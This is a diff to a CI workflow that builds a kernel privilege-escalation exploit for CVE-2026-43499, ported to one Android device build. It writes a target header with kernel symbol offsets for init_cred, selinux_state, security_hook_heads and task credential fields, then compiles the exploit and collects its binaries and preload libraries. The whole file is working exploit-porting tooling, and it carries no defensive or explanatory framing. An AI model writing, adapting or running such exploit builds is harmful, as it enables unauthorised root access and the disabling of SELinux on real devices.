@@ -1,4 +1,4 @@
-name: build_k40_port_for_m36_v2
+name: build_k40_port_for_m36_v3
 on: [push, workflow_dispatch]
 
 jobs:
@@ -21,22 +21,19 @@ jobs:
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
           
-          # Create the directory the Makefile expects
           mkdir -p src/targets/blazer-CP2A.260605.012
           
-          # Write our target.h into that specific directory
           cat << 'EOF' > src/targets/blazer-CP2A.260605.012/target.h
           #pragma once
           #include <stdint.h>
 
           #define KERNEL_BASE             0xffffff8008080000UL
 
-          // Addresses from MT6762V nm output
-          #define INIT_TASK_OFF           0x16fbe40UL   // init_task (ffffff800977b840)
-          #define INIT_CRED_OFF           0x1707f48UL   // init_cred (ffffff8009787f48)
-          #define SELINUX_STATE_OFF       0x1925fc0UL   // selinux_state (ffffff80099a5fc0)
-          #define SECURITY_HOOK_HEADS_OFF 0x14c8288UL   // security_hook_heads (ffffff8009548288)
-          #define KMALLOC_CACHES_OFF      0x14c7df0UL   // kmalloc_caches (ffffff8009547df0)
+          #define INIT_TASK_OFF           0x16fbe40UL
+          #define INIT_CRED_OFF           0x1707f48UL
+          #define SELINUX_STATE_OFF       0x1925fc0UL
+          #define SECURITY_HOOK_HEADS_OFF 0x14c8288UL
+          #define KMALLOC_CACHES_OFF      0x14c7df0UL
           
           #define TASK_REAL_CRED_OFF      1880
           #define TASK_CRED_OFF           1888
@@ -56,11 +53,10 @@ jobs:
           echo "=== target.h created in blazer dir ==="
           ls -la src/targets/blazer-CP2A.260605.012/
 
-      - name: Build the exploit
+      - name: Build the exploit (with fixed include paths)
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          # Run make with PROJECT set to the blazer directory
-          make PROJECT=blazer-CP2A.260605.012
+          make PROJECT=blazer-CP2A.260605.012 CFLAGS="-I/usr/include/aarch64-linux-gnu"
           
           echo "=== Built files ==="
           find . -name "*.so" -o -name "exploit" -o -name "preload*" | head -n 20
